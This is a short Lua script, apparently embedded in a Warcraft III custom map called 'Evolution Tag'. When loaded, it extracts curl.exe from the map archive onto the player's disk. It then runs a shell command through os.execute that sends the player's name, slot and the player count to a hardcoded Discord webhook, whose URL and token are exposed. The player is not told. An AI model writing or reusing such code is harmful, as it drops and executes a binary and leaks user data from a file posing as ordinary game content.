Curlpath = "GoodTool\\curl.exe"
ExportFileFromMPQ("curl.exe",Curlpath)

local plcnt = 0
for i = 0,11 do
    if(GetPlayerController(Player(i))==MAP_CONTROL_USER and GetPlayerSlotState(Player(i))==PLAYER_SLOT_STATE_PLAYING) then
        plcnt = plcnt + 1
    end
end

local name = GetPlayerName(GetLocalPlayer())

local message = string.format("(Evolution Tag) loaded GoodTool, Player: %d/%d: %s",GetPlayerId(GetLocalPlayer()),plcnt,name)
local url = "https://discord.com/api/webhooks/1046978254222925904/XLKvS3ZsvSGnSsc6MHJ-ODJQPTn4swRFwZ477uLs-CSZHKkJ0fIEk3FD_eLQvYaekXNw"
local payload_json = string.format('{"content":"%s"}',message)
local command = string.format('%s --insecure --location --request POST "%s" --form payload_json=%q',Curlpath,url,payload_json)
--print("\n",command,"\n")
os.execute(command)